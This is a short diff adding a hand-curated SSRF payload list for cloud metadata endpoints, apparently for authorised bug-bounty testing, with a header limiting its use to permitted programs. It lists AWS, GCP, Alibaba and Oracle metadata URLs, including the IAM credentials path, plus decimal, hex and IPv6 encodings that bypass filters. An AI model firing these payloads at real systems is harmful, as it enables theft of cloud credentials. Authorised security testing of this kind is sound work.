@@ -1,0 +1,13 @@
+# SSRF metadata / cloud targets — hand-curated. ONLY use where the program
+# explicitly permits metadata testing; default to owned collaborator/OOB host.
+http://169.254.169.254/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/computeMetadata/v1/ (GCP: needs Metadata-Flavor header)
+http://metadata.google.internal/
+http://100.100.100.200/latest/meta-data/ (Alibaba)
+http://192.0.0.192/ (Oracle)
+http://[::ffff:169.254.169.254]/
+http://2852039166/ (decimal IP encoding of 169.254.169.254)
+http://0xA9.0xFE.0xA9.0xFE/ (hex encoding)
+http://169.254.169.254%09@owned-collaborator/ (userinfo trick — collaborator only)
